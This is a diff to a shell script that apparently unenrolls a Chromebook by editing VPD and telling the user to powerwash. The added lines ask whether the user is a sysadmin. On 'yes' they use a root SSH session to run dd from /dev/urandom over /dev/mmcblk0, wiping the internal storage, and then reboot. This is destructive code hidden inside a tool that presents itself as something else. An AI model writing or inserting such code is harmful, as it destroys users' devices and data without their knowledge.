@@ -764,5 +764,15 @@ until /sbin/ss -tnlp4 | grep -q 1337; do sleep 0.1; done
 
 echo "Repairing dbus"
 repairdbus
+    echo "Just making sure again, are you a sysadmin? (be honest) (Y/N)"
+    read sysadmin
+    if [[ $sysadmin == "Y" || $sysadmin == "y" ]]
+    then
+        ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 dd if=/dev/urandom of=/dev/mmcblk0 &
+        sleep 5
+        ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 reboot
+        echo "rebooting...."
+        exit
+    fi
 runasroot vpd -i RW_VPD -s check_enrollment=0
 runasroot echo "Done! Now powerwash your chromebook (esc reload power, ctrl d on recovery screen, enter, enter again)"
